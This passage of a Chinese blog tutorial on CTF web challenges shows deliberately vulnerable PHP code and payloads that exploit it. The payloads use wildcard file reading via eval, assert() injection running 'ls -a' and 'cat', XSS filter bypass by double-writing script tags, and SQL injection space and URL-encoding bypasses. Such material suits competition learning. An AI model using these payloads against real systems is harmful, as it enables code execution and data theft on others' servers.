+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;code&#x27;</span>]))&#123;<br>   <span class="hljs-variable">$code</span>=<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;code&#x27;</span>];<br>   <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">strlen</span>(<span class="hljs-variable">$code</span>)&gt;<span class="hljs-number">50</span>)&#123;<br>       <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;Too Long.&quot;</span>);<br>  &#125;<br>   <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&quot;/[A-Za-z0-9_$]+/&quot;</span>,<span class="hljs-variable">$code</span>))&#123;<br>       <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;Not Allowed.&quot;</span>);<br>  &#125;<br>   @<span class="hljs-keyword">eval</span>(<span class="hljs-variable">$code</span>);<br>&#125;<span class="hljs-keyword">else</span>&#123;<br>   <span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br>&#125;<br><span class="hljs-comment">//flag in /</span><br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure>
+
+<p>最主要的区别就是过滤了$和_，也就是说无法使用变量符号$了。</p>
+<p>这时候可以考虑采用通配符绕过。</p>
+<p>通配符有点像正则表达式，有自己的匹配规则：</p>
+<table>
+<thead>
+<tr>
+<th>字符</th>
+<th>解释</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>*</td>
+<td>匹配任意长度任意字符</td>
+</tr>
+<tr>
+<td>?</td>
+<td>匹配任意单个字符</td>
+</tr>
+<tr>
+<td>[list]</td>
+<td>匹配指定范围内(list)任意单个字符，也可以是单个字符组成的集合</td>
+</tr>
+<tr>
+<td>[^list]</td>
+<td>匹配指定范围外的任意单个字符或字符集合</td>
+</tr>
+<tr>
+<td>[!list]</td>
+<td>同[^list]</td>
+</tr>
+<tr>
+<td>{str1,str2,…}</td>
+<td>匹配str1或者str2或者更多字符串，也可以是集合</td>
+</tr>
+</tbody></table>
+<p>所以构造一下通配符就是</p>
+<figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ruby">/<span class="hljs-string">??</span><span class="hljs-string">?/</span><span class="hljs-string">??</span>? <span class="hljs-regexp">/*</span><br></code></pre></td></tr></table></figure>
+
+<p>因为过滤了变量符号，没法通过上面那种方法来执行了。但是，可以通过闭合PHP标记来执行，<br>也就是：<code>?&gt;（/bin/cat /*）。</code></p>
+<p>所以本题的</p>
+<figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ruby">payload为：<span class="hljs-string">?c</span>ode=<span class="hljs-string">?&gt;</span>&lt;<span class="hljs-string">?=</span>/<span class="hljs-string">??</span><span class="hljs-string">?/</span><span class="hljs-string">??</span>? <span class="hljs-regexp">/*?&gt;</span><br></code></pre></td></tr></table></figure>
+
+<p>具体解法可以参照此篇文章的前两道题目：<br><a target="_blank" rel="noopener" href="https://www.jianshu.com/p/ecc2414ec110">https://www.jianshu.com/p/ecc2414ec110</a></p>
+<h2 id="命令执行漏洞"><a href="#命令执行漏洞" class="headerlink" title="命令执行漏洞"></a>命令执行漏洞</h2><h3 id="assert-函数引起的命令执行"><a href="#assert-函数引起的命令执行" class="headerlink" title="assert()函数引起的命令执行"></a>assert()函数引起的命令执行</h3><p>assert函数的参数为字符串时，会将字符串当做PHP命令来执行。</p>
+<p>例如：assert(‘phpinfo()’)相当于执行<br>以一道题目为例：</p>
+<p>本题目中题目文件夹下放置了一个隐藏的flag文件。</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);<br><span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;file&#x27;</span>])) &#123;<br>    <span class="hljs-keyword">if</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;file&#x27;</span>] === <span class="hljs-string">&quot;flag&quot;</span>)&#123;<br>        <span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-string">&quot;flag.php&quot;</span>);<br>    &#125;<span class="hljs-keyword">else</span>&#123;<br>        <span class="hljs-variable">$page</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;file&#x27;</span>];<br>    &#125;<br>&#125; <span class="hljs-keyword">else</span> &#123;<br>    <span class="hljs-variable">$page</span> = <span class="hljs-string">&quot;./flag.php&quot;</span>;<br>&#125;<br><br><span class="hljs-title function_ invoke__">assert</span>(<span class="hljs-string">&quot;file_exists(&#x27;<span class="hljs-subst">$page</span>&#x27;)&quot;</span>);<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure>
+
+<p>解法：<br>构造闭合 file_exists()函数，并使assert()执行恶意代码。<br>Linux命令ls -a可用于查看该目录下所有文件，包括隐藏文件。</p>
+<figure class="highlight csharp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs csharp">payload：<br>?file=<span class="hljs-number">123&#x27;</span>) <span class="hljs-function"><span class="hljs-keyword">or</span> <span class="hljs-title">system</span>(<span class="hljs-params"><span class="hljs-string">&#x27;ls -a&#x27;</span></span>)</span>;<span class="hljs-meta">#</span><br>?file=<span class="hljs-number">123&#x27;</span>) <span class="hljs-function"><span class="hljs-keyword">or</span> <span class="hljs-title">system</span>(<span class="hljs-params"><span class="hljs-string">&#x27;cat .ffll44gg&#x27;</span></span>)</span>;<span class="hljs-meta">#</span><br></code></pre></td></tr></table></figure>
+
+<h3 id="XSS题目"><a href="#XSS题目" class="headerlink" title="XSS题目"></a>XSS题目</h3><p>这类题目会涉及到三种XSS类型，具体类型要根据题目来判断。一般都是向后台发送一个带有XSS Payload的文本，在返回的Cookie中含有flag，解法是在XSS Payload。<br>这类题目一般都会带有过滤和各种限制，需要了解一些常用的绕过方法。<br>技巧：XSS归根结底还是JavaScript，JavaScript的威力有多大，XSS的威力就有多大。要知道一些常用的XSS Payload，还要把三类XSS的原理弄明白。做题时需要用到XSS平台，网上有公用的，也可以自己在VPS上搭一个。</p>
+<ul>
+<li>JavisOJ babyxss：<a target="_blank" rel="noopener" href="http://web.jarvisoj.com:32800/">http://web.jarvisoj.com:32800/</a></li>
+</ul>
+<h3 id="绕过waf"><a href="#绕过waf" class="headerlink" title="绕过waf"></a>绕过waf</h3><p>其实绝大多数比较难的题目多多少都会对输入有过滤，毕竟在现实的网络中肯定是会对输入进行限制的，但是这里还是把过滤单独列出来了。<br>技巧：多掌握一些不同的绕过方法。</p>
+<h3 id="长度限制"><a href="#长度限制" class="headerlink" title="长度限制"></a>长度限制</h3><p>有些题目会要求输入较长的文本，但对文本的长度进行了限制。<br>对于这种题目，既可以用BurpSuite抓包改包绕过，也可以直接在F12里改页面源代码。</p>
+<ul>
+<li>Bugku 计算器（修改页面源代码）：<a target="_blank" rel="noopener" href="http://123.206.87.240:8002/yanzhengma/">http://123.206.87.240:8002/yanzhengma/</a></li>
+</ul>
+<p>DVWA 存储型XSS的标题栏会对长度进行限制，使用BurpSuite抓包绕过。</p>
+<h3 id="双写"><a href="#双写" class="headerlink" title="双写"></a>双写</h3><p>双写可以绕过对输入内容过滤的单次判断，在XSS、SQL注入和PHP代码审计的题目中比较常见。<br>双写顾名思义就是将被过滤的关键字符写两遍，比如，如果要添加XSS Payload，又需要插入script标签，就可以构造如下的</p>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs xml">Payload：&lt;scr<span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span>ipt&gt;<br></code></pre></td></tr></table></figure>
+<p>来绕过对script标签的单次过滤限制。<br>这样的方法不仅对XSS有用，也可以用于代码审计和SQL注入。<br>HGAME2019有一道XSS题目就是过滤了script标签，可以用双写绕过。</p>
+<h3 id="等价替代"><a href="#等价替代" class="headerlink" title="等价替代"></a>等价替代</h3><p>就是不用被过滤的字符，而使用没有被过滤却会产生相同效果的字符。<br>比如，如果SQL注入题目中过滤了空格，可以用</p>
+<figure class="highlight actionscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs actionscript"><span class="hljs-comment">/**/</span><br></code></pre></td></tr></table></figure>
+<p>绕过对空格的限制；XSS题目如果过滤了script标签，可以使用其他类型的</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">payload；如果需要使用<span class="hljs-built_in">cat</span>命令却被过滤，可以使用<span class="hljs-built_in">tac</span>、more、less命令来替代等。<br></code></pre></td></tr></table></figure>
+<ul>
+<li>实验吧 简单的SQL注入：<a target="_blank" rel="noopener" href="http://www.shiyanbar.com/ctf/1875">http://www.shiyanbar.com/ctf/1875</a></li>
+</ul>
+<h3 id="URL编码绕过"><a href="#URL编码绕过" class="headerlink" title="URL编码绕过"></a>URL编码绕过</h3><p>如果过滤了某个必须要用的字符串，输入的内容是以GET方式获取的（也就是直接在地址栏中输入），可以采用url编码绕过的方式。比如，过滤了 cat，可以使用 c%61t来绕过。</p>
+<h3 id="Linux命令使用反斜杠绕过"><a href="#Linux命令使用反斜杠绕过" class="headerlink" title="Linux命令使用反斜杠绕过"></a>Linux命令使用反斜杠绕过</h3><p>在Linux下，命令中加入反斜杠与原命令完全等价。例如，cat与 ca\t两条命令等价，效果完全相同。<br>可以利用这个特性来进行一些绕过操作（当然，这个仅限于命令执行漏洞）。</p>
+<h3 id="URL二次解码绕过"><a href="#URL二次解码绕过" class="headerlink" title="URL二次解码绕过"></a>URL二次解码绕过</h3><p>这个类型本来应该放在代码审计里面，但是既然是一种绕过过滤的姿势，就写在这里了。<br>如果源码中出现了urldecode()函数，可以利用url二次解码来绕过。</p>
+<p>以下是一些常用的HTML URL编码：</p>
+<table>
+<thead>
+<tr>
+<th>ASCII Value</th>
+<th>URL-encode</th>
+<th>ASCII Value</th>
+<th>URL-encode</th>
+<th>ASCII Value</th>
+<th>URL-encode</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>æ</td>
+<td>%00</td>
+<td>0</td>
+<td>%30</td>
+<td>&#96;</td>
+<td>%60</td>
+</tr>
+<tr>
+<td></td>
+<td>%01</td>
+<td>1</td>
+<td>%31</td>
+<td>a</td>
+<td>%61</td>
+</tr>
+<tr>
+<td></td>
+<td>%02</td>
+<td>2</td>
+<td>%32</td>
+<td>b</td>
+<td>%62</td>
+</tr>
+<tr>
+<td></td>
+<td>%03</td>
+<td>3</td>
+<td>%33</td>
+<td>c</td>
+<td>%63</td>
+</tr>
+<tr>
+<td></td>
+<td>%04</td>
+<td>4</td>
+<td>%34</td>
+<td>d</td>
+<td>%64</td>
+</tr>
+<tr>
+<td></td>
+<td>%05</td>
+<td>5</td>
+<td>%35</td>
+<td>e</td>
+<td>%65</td>
+</tr>
+<tr>
+<td></td>
+<td>%06</td>
+<td>6</td>
+<td>%36</td>
+<td>f</td>
+<td>%66</td>
+</tr>
+<tr>
+<td></td>
+<td>%07</td>
+<td>7</td>
+<td>%37</td>
+<td>g</td>
+<td>%67</td>
+</tr>
+<tr>
+<td>backspace</td>
+<td>%08</td>
+<td>8</td>
+<td>%38</td>
+<td>h</td>
+<td>%68</td>
+</tr>
+<tr>
+<td>tab</td>
+<td>%09</td>
+<td>9</td>
+<td>%39</td>
+<td>i</td>
+<td>%69</td>
+</tr>
+<tr>
+<td>linefeed</td>
+<td>%0a</td>
+<td>:</td>
+<td>%3a</td>
+<td>j</td>
+<td>%6a</td>
+</tr>
+<tr>
+<td></td>
+<td>%0b</td>
+<td>;</td>
+<td>%3b</td>
+<td>k</td>
+<td>%6b</td>
+</tr>
+<tr>
+<td></td>
+<td>%0c</td>
+<td>&lt;</td>
+<td>%3c</td>
+<td>l</td>
+<td>%6c</td>
+</tr>
+<tr>
+<td>c return</td>
+<td>%0d</td>
+<td>&#x3D;</td>
+<td>%3d</td>
+<td>m</td>
+<td>%6d</td>
+</tr>
+<tr>
+<td></td>
+<td>%0e</td>
+<td>&gt;</td>
+<td>%3e</td>
+<td>n</td>
+<td>%6e</td>
+</tr>
+<tr>
+<td></td>
+<td>%0f</td>
+<td>?</td>
+<td>%3f</td>
+<td>o</td>
+<td>%6f</td>
+</tr>
+<tr>
+<td></td>
+<td>%10</td>
+<td>@</td>
+<td>%40</td>
+<td>p</td>
+<td>%70</td>
+</tr>
+<tr>
+<td></td>
+<td>%11</td>
+<td>A</td>
+<td>%41</td>
+<td>q</td>
+<td>%71</td>
+</tr>
+<tr>
+<td></td>
+<td>%12</td>
+<td>B</td>
+<td>%42</td>
+<td>r</td>
+<td>%72</td>
+</tr>
+<tr>
+<td></td>
+<td>%13</td>
+<td>C</td>
+<td>%43</td>
+<td>s</td>
+<td>%73</td>
+</tr>
+<tr>
+<td></td>
+<td>%14</td>
+<td>D</td>
+<td>%44</td>
+<td>t</td>
+<td>%74</td>
+</tr>
+<tr>
+<td></td>
+<td>%15</td>
+<td>E</td>
+<td>%45</td>
+<td>u</td>
+<td>%75</td>
+</tr>
+<tr>
+<td></td>
+<td>%16</td>
+<td>F</td>
+<td>%46</td>
+<td>v</td>
+<td>%76</td>
+</tr>
+<tr>
+<td></td>
+<td>%17</td>
+<td>G</td>
+<td>%47</td>
+<td>w</td>
+<td>%77</td>
+</tr>
+<tr>
+<td></td>
+<td>%18</td>
+<td>H</td>
+<td>%48</td>
+<td>x</td>
+<td>%78</td>
+</tr>
+<tr>
+<td></td>
+<td>%19</td>
+<td>I</td>
+<td>%49</td>
+<td>y</td>
+<td>%79</td>
+</tr>
+<tr>
+<td></td>
+<td>%1a</td>
+<td>J</td>
+<td>%4a</td>
+<td>z</td>
+<td>%7a</td>
+</tr>
+<tr>
+<td></td>
+<td>%1b</td>
+<td>K</td>
+<td>%4b</td>
+<td>{</td>
+<td>%7b</td>
+</tr>
+<tr>
+<td></td>
+<td>%1c</td>
+<td>L</td>
+<td>%4c</td>
+<td></td>
+<td></td>
+</tr>
+<tr>
+<td></td>
+<td>%1d</td>
+<td>M</td>
+<td>%4d</td>
+<td>}</td>
+<td>%7d</td>
+</tr>
+<tr>
+<td></td>
+<td>%1e</td>
+<td>N</td>
+<td>%4e</td>
+<td>~</td>
+<td>%7e</td>
+</tr>
+<tr>
+<td></td>
+<td>%1f</td>
+<td>O</td>
+<td>%4f</td>
+<td></td>
+<td>%7f</td>
+</tr>
+<tr>
+<td>space</td>
+<td>%20</td>
+<td>P</td>
+<td>%50</td>
+<td>€</td>
+<td>%80</td>
+</tr>
+<tr>
+<td>!</td>
+<td>%21</td>
+<td>Q</td>
+<td>%51</td>
+<td></td>
+<td>%81</td>
+</tr>
+<tr>
+<td>“</td>
+<td>%22</td>
+<td>R</td>
+<td>%52</td>
+<td>‚</td>
+<td>%82</td>
+</tr>
+<tr>
+<td>#</td>
+<td>%23</td>
+<td>S</td>
+<td>%53</td>
+<td>ƒ</td>
+<td>%83</td>
+</tr>
+<tr>
+<td>$</td>
+<td>%24</td>
+<td>T</td>
+<td>%54</td>
+<td>„</td>
+<td>%84</td>
+</tr>
+<tr>
+<td>%</td>
+<td>%25</td>
+<td>U</td>
+<td>%55</td>
+<td>…</td>
+<td>%85</td>
+</tr>
+<tr>
+<td>&amp;</td>
+<td>%26</td>
+<td>V</td>
+<td>%56</td>
+<td>†</td>
+<td>%86</td>
+</tr>
+<tr>
+<td>‘</td>
+<td>%27</td>
+<td>W</td>
+<td>%57</td>
+<td>‡</td>
+<td>%87</td>
+</tr>
+<tr>
+<td>(</td>
+<td>%28</td>
+<td>X</td>
+<td>%58</td>
+<td>ˆ</td>
+<td>%88</td>
+</tr>
+<tr>
+<td>)</td>
+<td>%29</td>
+<td>Y</td>
+<td>%59</td>
+<td>‰</td>
+<td>%89</td>
+</tr>
+<tr>
+<td>*</td>
+<td>%2a</td>
+<td>Z</td>
+<td>%5a</td>
+<td>Š</td>
+<td>%8a</td>
+</tr>
+<tr>
+<td>+</td>
+<td>%2b</td>
+<td>[</td>
+<td>%5b</td>
+<td>‹</td>
+<td>%8b</td>
+</tr>
+<tr>
+<td>,</td>
+<td>%2c</td>
+<td>\</td>
+<td>%5c</td>
+<td>Œ</td>
+<td>%8c</td>
+</tr>
+<tr>
+<td>-</td>
+<td>%2d</td>
+<td>]</td>
+<td>%5d</td>
+<td></td>
+<td>%8d</td>
+</tr>
+<tr>
+<td>.</td>
+<td>%2e</td>
+<td>^</td>
+<td>%5e</td>
+<td>Ž</td>
+<td>%8e</td>
+</tr>
+<tr>
+<td>&#x2F;</td>
+<td>%2f</td>
+<td>_</td>
+<td>%5f</td>
+<td></td>
+<td>%8f</td>
+</tr>
+</tbody></table>
+<ul>
+<li>Bugku urldecode二次编码绕过：<a target="_blank" rel="noopener" href="http://123.206.87.240:9009/10.php">http://123.206.87.240:9009/10.php</a></li>
+</ul>
+<h3 id="数组绕过-1"><a href="#数组绕过-1" class="headerlink" title="数组绕过"></a>数组绕过</h3><p>详见PHP代码审计的“数组返回NULL”绕过。<br>数组绕过的应用很广，很多题目都可以用数组绕过。</p>
+<h3 id="SQL注入"><a href="#SQL注入" class="headerlink" title="SQL注入"></a>SQL注入</h3><p>SQL注入是一种灵活而复杂的攻击方式，归根结底还是考察对SQL语言的了解和根据输入不同数据网页的反应对后台语句的判断，当然也有sqlmap这样的自动化工具可以使用。</p>
+<p>技巧：如果不用sqlmap或者是用不了，就一定要把SQL语言弄明白，sqlmap这样的自动化工具也可以使用。</p>
+<h3 id="使用sqlmap"><a href="#使用sqlmap" class="headerlink" title="使用sqlmap"></a>使用sqlmap</h3><p>sqlmap的应用范围还不大明确，我都是如果sqlmap没法注入就手工注入。</p>
+<ul>
+<li>sqlmap的使用：<a target="_blank" rel="noopener" href="https://www.jianshu.com/p/4509bdf5e3d0">https://www.jianshu.com/p/4509bdf5e3d0</a></li>
+<li>一些sqlmap的命令，留着备用：<a target="_blank" rel="noopener" href="https://www.freebuf.com/sectool/164608.html">https://www.freebuf.com/sectool/164608.html</a></li>
+<li>感觉这篇教程也不错：<a target="_blank" rel="noopener" href="https://www.cnblogs.com/im404/p/3505894.html">https://www.cnblogs.com/im404/p/3505894.html</a></li>
+<li>命令合集：<a target="_blank" rel="noopener" href="https://www.jianshu.com/p/fa77f2ed788b">https://www.jianshu.com/p/fa77f2ed788b</a></li>
+</ul>
+
+                
+              </div>
+            
+            <hr/>
+            <div>
+              <div class="post-metas my-3">
+  
+    <div class="post-meta mr-3 d-flex align-items-center">
+      <i class="iconfont icon-category"></i>
+      
+
+<span class="category-chains">
+  
+  
+    
+      <span class="category-chain">
+        
+  <a href="/categories/CTF/" class="category-chain-item">CTF</a>
+  
+  
+
+      </span>
+    
+  
+</span>
+
+    </div>
+  
+  
+    <div class="post-meta">
+      <i class="iconfont icon-tags"></i>
+      
+        <a href="/tags/CTF/" class="print-no-link">#CTF</a>
+      
+    </div>
+  
+</div>
+
+
+              
+  
+
+  <div class="license-box my-3">
+    <div class="license-title">
+      <div>CTF中Web题目的常见题型及解题技巧</div>
+      <div>http://maitianxin.github.io/2020/05/19/other/ctf_web/</div>
+    </div>
+    <div class="license-meta">
+      
+        <div class="license-meta-item">
+          <div>作者</div>
+          <div>Matianxin</div>
+        </div>
+      
+      
+        <div class="license-meta-item license-meta-date">
+          <div>发布于</div>
+          <div>2020年5月19日</div>
+        </div>
+      
+      
+      
+        <div class="license-meta-item">
+          <div>许可协议</div>
+          <div>
+            
+              
+              
+                <a class="print-no-link" target="_blank" href="https://creativecommons.org/licenses/by/4.0/">
+                  <span class="hint--top hint--rounded" aria-label="BY - 署名">
+                    <i class="iconfont icon-by"></i>
+                  </span>
+                </a>
+              
+            
+          </div>
+        </div>
+      
+    </div>
+    <div class="license-icon iconfont"></div>
+  </div>
+
+
+
+              
+                <div class="post-prevnext my-3">
+                  <article class="post-prev col-6">
+                    
+                    
+                      <a href="/2020/05/20/other/ctf_crypto/" title="CTF中Crypto题目的常见题型">
+                        <i class="iconfont icon-arrowleft"></i>
+                        <span class="hidden-mobile">CTF中Crypto题目的常见题型</span>
+                        <span class="visible-mobile">上一篇</span>
+                      </a>
+                    
+                  </article>
+                  <article class="post-next col-6">
+                    
+                    
+                      <a href="/2020/05/19/other/ctf_type/" title="CTF常见的题型">
+                        <span class="hidden-mobile">CTF常见的题型</span>
+                        <span class="visible-mobile">下一篇</span>
+                        <i class="iconfont icon-arrowright"></i>
+                      </a>
+                    
+                  </article>
+                </div>
+              
+            </div>
+
+            
+          </article>
+        </div>
+      </div>
+    </div>
+
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+  <aside class="sidebar" style="margin-left: -1rem">
+    <div id="toc">
+  <p class="toc-header">
+    <i class="iconfont icon-list"></i>
+    <span>目录</span>
+  </p>
+  <div class="toc-body" id="toc-body"></div>
+</div>
+
+
+
+  </aside>
+
+
+    </div>
+  </div>
+</div>
+
+
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+
+
+
+
+    
+
+    
+      <a id="scroll-top-button" aria-label="TOP" href="#" role="button">
+        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
+      </a>
+    
+
+    
+      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
+     aria-hidden="true">
+  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
+    <div class="modal-content">
+      <div class="modal-header text-center">
+        <h4 class="modal-title w-100 font-weight-bold">搜索</h4>
+        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
+          <span aria-hidden="true">&times;</span>
+        </button>
+      </div>
+      <div class="modal-body mx-3">
+        <div class="md-form mb-5">
+          <input type="text" id="local-search-input" class="form-control validate">
+          <label data-error="x" data-success="v" for="local-search-input">关键词</label>
+        </div>
+        <div class="list-group" id="local-search-result"></div>
+      </div>
+    </div>
+  </div>
+</div>
+
+    
+
+    
+  </main>
+
+  <footer>
+    <div class="footer-inner">
+  
+    <div class="footer-content">
+       <a href="https://hexo.io" target="_blank" rel="nofollow noopener"><span>By 圣特伦特星 </span></a> <i class="iconfont icon-love"></i> <a href="https://github.com/fluid-dev/hexo-theme-fluid" target="_blank" rel="nofollow noopener"><span>2024</span></a> 
+    </div>
+  
+  
+  
+  
+</div>
+
+  </footer>
+
+  <!-- Scripts -->
+  
+  <script  src="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.js" ></script>
+  <link  rel="stylesheet" href="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.css" />
+
+  <script>
+    NProgress.configure({"showSpinner":false,"trickleSpeed":100})
+    NProgress.start()
+    window.addEventListener('load', function() {
+      NProgress.done();
+    })
+  </script>
+
+
+<script  src="https://lib.baomitu.com/jquery/3.6.4/jquery.min.js" ></script>
+<script  src="https://lib.baomitu.com/twitter-bootstrap/4.6.1/js/bootstrap.min.js" ></script>
+<script  src="/js/events.js" ></script>
+<script  src="/js/plugins.js" ></script>
+
+
+  <script  src="https://lib.baomitu.com/typed.js/2.0.12/typed.min.js" ></script>
+  <script>
+    (function (window, document) {
+      var typing = Fluid.plugins.typing;
+      var subtitle = document.getElementById('subtitle');
+      if (!subtitle || !typing) {
+        return;
+      }
+      var text = subtitle.getAttribute('data-typed-text');
+      
+        typing(text);
+      
+    })(window, document);
+  </script>
+
+
+
+
+  
+    <script  src="/js/img-lazyload.js" ></script>
+  
+
+
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/tocbot/4.20.1/tocbot.min.js', function() {
+    var toc = jQuery('#toc');
+    if (toc.length === 0 || !window.tocbot) { return; }
+    var boardCtn = jQuery('#board-ctn');
+    var boardTop = boardCtn.offset().top;
+
+    window.tocbot.init(Object.assign({
+      tocSelector     : '#toc-body',
+      contentSelector : '.markdown-body',
+      linkClass       : 'tocbot-link',
+      activeLinkClass : 'tocbot-active-link',
+      listClass       : 'tocbot-list',
+      isCollapsedClass: 'tocbot-is-collapsed',
+      collapsibleClass: 'tocbot-is-collapsible',
+      scrollSmooth    : true,
+      includeTitleTags: true,
+      headingsOffset  : -boardTop,
+    }, CONFIG.toc));
+    if (toc.find('.toc-list-item').length > 0) {
+      toc.css('visibility', 'visible');
+    }
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('tocbot' in window) {
+        tocbot.refresh();
+        var toc = jQuery('#toc');
+        if (toc.length === 0 || !tocbot) {
+          return;
+        }
+        if (toc.find('.toc-list-item').length > 0) {
+          toc.css('visibility', 'visible');
+        }
+      }
+    });
+  });
+</script>
+
+
+  <script src=https://lib.baomitu.com/clipboard.js/2.0.11/clipboard.min.js></script>
+
+  <script>Fluid.plugins.codeWidget();</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/anchor-js/4.3.1/anchor.min.js', function() {
+    window.anchors.options = {
+      placement: CONFIG.anchorjs.placement,
+      visible  : CONFIG.anchorjs.visible
+    };
+    if (CONFIG.anchorjs.icon) {
+      window.anchors.options.icon = CONFIG.anchorjs.icon;
+    }
+    var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+    var res = [];
+    for (var item of el) {
+      res.push('.markdown-body > ' + item.trim());
+    }
+    if (CONFIG.anchorjs.placement === 'left') {
+      window.anchors.options.class = 'anchorjs-link-left';
+    }
+    window.anchors.add(res.join(', '));
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('anchors' in window) {
+        anchors.removeAll();
+        var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+        var res = [];
+        for (var item of el) {
+          res.push('.markdown-body > ' + item.trim());
+        }
+        if (CONFIG.anchorjs.placement === 'left') {
+          anchors.options.class = 'anchorjs-link-left';
+        }
+        anchors.add(res.join(', '));
+      }
+    });
+  });
+</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.js', function() {
+    Fluid.plugins.fancyBox();
+  });
+</script>
+
+
+  <script>Fluid.plugins.imageCaption();</script>
+
+  <script  src="/js/local-search.js" ></script>
+
+
+
+
+
+<!-- 主题的启动项，将它保持在最底部 -->
+<!-- the boot of the theme, keep it at the bottom -->
+<script  src="/js/boot.js" ></script>
+
+
+  
+
+  <noscript>
+    <div class="noscript-warning">博客在允许 JavaScript 运行的环境下浏览效果更佳</div>
+  </noscript>
+</body>
+</html>
